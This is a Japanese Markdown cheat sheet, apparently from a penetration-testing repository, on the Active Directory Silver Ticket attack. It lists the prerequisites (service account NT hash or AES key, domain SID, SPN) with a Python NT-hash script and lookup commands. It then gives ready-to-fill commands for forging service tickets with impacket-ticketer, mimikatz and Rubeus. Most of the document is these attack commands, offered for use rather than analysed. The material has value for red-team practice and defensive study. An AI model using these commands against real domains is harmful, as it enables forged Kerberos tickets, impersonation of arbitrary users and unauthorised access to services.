# Silver Tickets攻撃

`Silver Ticket攻撃`は、Active Directory (AD) 環境におけるサービスチケットの悪用を含む。この手法は、`サービスアカウントのNTLMハッシュを取得すること`に依存し、コンピュータアカウントなどのチケットを偽造するために使用される。この偽造されたチケットを使用することで、攻撃者はネットワーク上の特定のサービスにアクセスでき、任意のユーザーに偽装することができる([Pass The Ticket攻撃](https://github.com/namahano/Cheat-Sheet/blob/main/Active%20Directory/Movement/Kerberos/Pass%20The%20Ticket.md))。

## 攻撃に必要なもの

- サービスアカウントのRC4キー(NTLMハッシュ) or AESキー(128 bitまたは 256 bit)

  [NTLM Hash Generator](https://codebeautify.org/ntlm-hash-generator)

  スクリプトを使う

  ```python
  import sys
  import hashlib
  
  def calc_nt_hash(p):
      return hashlib.new('md4', p.encode('utf-16le')).hexdigest()
  
  if __name__ == '__main__':
      print(calc_nt_hash(sys.argv[1]))
  ```

- Domain

- DomainのSID

  ```
  impacket-lookupsid -hashes 'LMhash:NThash' '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>'
  ```

- ServicePrincipalName

  PowerView

  ```
  Get-DomainUser -Identity <USERNAME> | select serviceprincipalname
  ```

  AD Module

  ```
  Get-ADUser -Filter {SamAccountName -eq "<USERNAME>" } -Properties ServicePrincipalNames
  Get-ADUser -Identity <USERNAME> -Properties ServicePrincipalName | select ServicePrincipalName
  ```

  `ServicePrincipalName` と `SID` はBloodHoundからも取得可能

# Ticketを取得

## Linux

with an NT hash

```
impacket-ticketer -nthash <NTLM_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <ServicePrincipalName> "<USERNAME>"
```

with an AES (128 or 256 bits) key

```
impacket-ticketer -aesKey <AesKey> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <ServicePrincipalName> "<USERNAME>"
```

## Windows

### mimikatz

with an NT hash

```
kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<NTLM_HASH> /user:<USERNAME> /target:<Target> /service:<SPN>
```

with an AES (128 or 256 bits) key

```
# AES 128 key
kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes128:<Aes128_Key> /user:<USERNAME> /target:<Target> /service:<SPN>

# AES 256 key
kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes256:<Aes256_Key> /user:<USERNAME> /target:<Target> /service:<SPN>
```
### Rubeus

with an NT hash

```
Rubeus.exe silver /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<NTLM_HASH> /user:<USERNAME> /service:<SPN> /nowrap
```

with an AES (128 or 256 bits) key

```
# AES 128 key
Rubeus.exe silver /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes128:<Aes128_Key> /user:<USERNAME> /service:<SPN> /nowrap

# AES 256 key
Rubeus.exe silver /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes256:<Aes256_Key> /user:<USERNAME> /service:<SPN> /nowrap
```

